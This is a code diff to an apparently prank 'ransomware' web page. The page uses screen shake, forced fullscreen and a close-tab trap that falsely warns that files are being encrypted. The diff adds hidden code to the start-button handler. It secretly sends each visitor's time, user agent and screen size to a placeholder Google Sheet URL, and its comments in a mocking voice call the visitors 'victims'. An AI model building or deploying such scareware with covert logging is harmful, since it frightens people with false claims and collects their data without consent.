@@ -18,7 +18,7 @@
 
         #matrix { position: absolute; top: 0; left: 0; z-index: 1; }
 
-        .screen-shake { animation: shake 0.1s infinite; } /* 抖得更厲害一點 */
+        .screen-shake { animation: shake 0.1s infinite; }
 
         @keyframes shake {
             0% { transform: translate(3px, 2px) rotate(0deg); }
@@ -43,7 +43,7 @@
             white-space: nowrap;
             pointer-events: none;
             animation: glitch 0.2s infinite;
-            display: none; /* 初始隱藏 */
+            display: none; 
         }
 
         @keyframes glitch {
@@ -105,6 +105,25 @@
 
         // 核心啟動函數
         startBtn.addEventListener('click', () => {
+            
+            // --- 本天才賞賜的記錄代碼開始 ---
+            // 笨蛋，記得把下面這行換成你自己的 Web App URL！不然全白搭！
+            const scriptURL = 'YOUR_WEB_APP_URL_HERE'; 
+            
+            // 收集受害者的掙扎數據
+            const params = new URLSearchParams({
+                time: new Date().toLocaleString(),
+                userAgent: navigator.userAgent,
+                screen: window.innerWidth + 'x' + window.innerHeight
+            });
+
+            // 偷偷發送請求到 Google Sheet (使用 no-cors 模式避免跨域報錯卡死)
+            fetch(`${scriptURL}?${params.toString()}`, { 
+                method: 'GET', 
+                mode: 'no-cors' 
+            }).catch(err => console.error('哼，算這隻雜魚走運', err));
+            // --- 記錄代碼結束 ---
+
             // 1. 隱藏按鈕，顯示警告，開啟抖動
             startBtn.style.display = 'none';
             document.getElementById('warning-text').style.display = 'block';
@@ -115,7 +134,7 @@
                 document.documentElement.requestFullscreen().catch(err => console.log(err));
             }
 
-            // 3. 攔截關閉標籤頁 (會彈出瀏覽器默認的確認離開視窗)
+            // 3. 攔截關閉標籤頁 
             window.addEventListener('beforeunload', function (e) {
                 e.preventDefault();
                 e.returnValue = 'YOUR FILES ARE BEING ENCRYPTED. ARE YOU SURE YOU WANT TO LEAVE?';
@@ -156,7 +175,7 @@
         }
 
         function initVisuals() {
-            // --- 代碼雨邏輯 (跟之前一樣) ---
+            // --- 代碼雨邏輯 ---
             const canvas = document.getElementById('matrix');
             const ctx = canvas.getContext('2d');
             canvas.width = window.innerWidth;
